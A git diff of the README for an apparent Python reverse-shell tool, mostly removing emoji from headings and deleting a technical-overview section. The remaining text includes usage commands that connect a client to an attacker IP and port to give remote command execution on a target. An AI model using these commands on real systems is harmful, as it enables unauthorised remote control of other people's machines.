@@ -22,7 +22,7 @@ reverse-shell/
 └── README.md          # This documentation
 ```
 
-## 🔧 **Setup & Installation**
+##  **Setup & Installation**
 
 ### **Requirements**
 - Python 3.6 or higher
@@ -42,7 +42,7 @@ reverse-shell/
    python client.py [ATTACKER_IP]
    ```
 
-## 🚀 **Usage Guide**
+## **Usage Guide**
 
 ### **Step 1: Find Your Attacker IP Address**
 
@@ -101,7 +101,7 @@ python client.py ATTACKER_IP_ADDRESS 4444
 python client.py 192.168.1.100 9001
 ```
 
-## 📖 **Command Reference**
+## **Command Reference**
 
 ### **Basic Commands**
 Once connected, you can execute commands on the target machine:
@@ -164,22 +164,13 @@ python server.py 127.0.0.1
 python client.py 127.0.0.1
 ```
 
-### **Technical Overview**
-1. **Server** binds to a port and listens for incoming connections
-2. **Client** connects to the server's IP and port
-3. **Command Loop**:
-   - Server sends commands to client
-   - Client executes commands locally
-   - Client sends output back to server
-   - Server displays output to user
-
 ### **Features**
 - **Auto-reconnect**: Client reconnects automatically if connection drops
 - **Platform detection**: Uses correct shell for Windows/Linux
 - **Timeout handling**: Commands timeout after 30 seconds
 - **Error recovery**: Graceful handling of connection issues
 
-## 📄 **License**
+##  **License**
 
 This project is for educational purposes only. Users are solely responsible for complying with all applicable laws.
 
